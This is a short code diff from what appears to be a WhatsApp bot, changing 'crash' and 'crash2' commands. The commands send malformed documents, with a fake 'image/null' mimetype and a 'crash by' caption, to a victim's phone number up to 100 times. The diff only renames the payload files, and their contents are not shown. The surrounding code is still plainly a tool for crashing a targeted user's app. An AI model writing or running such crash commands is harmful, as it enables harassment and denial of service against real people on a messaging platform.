@@ -632,9 +632,9 @@ if (command === "crash") {
 
     async function XeonyCrashy(name, chat) {
         await sock.sendMessage(chat, {
-            document: { url: "./xeontext1.js" },
+            document: { url: "./wantedasa1.js" },
             mimetype: "image/null",
-            fileName: `xeontext1.js`,
+            fileName: `wantedasa1.js`,
             caption: `crash by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ`
         });
     }
@@ -657,7 +657,7 @@ if (command === "crash2") {
     const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     const amount = 100;
 
-    const filePath = "./xeontext2.js";
+    const filePath = "./wantedasa2.js";
 
     if (!fs.existsSync(filePath)) {
         return reply(sock, msg, "❌ Datei nicht gefunden!");
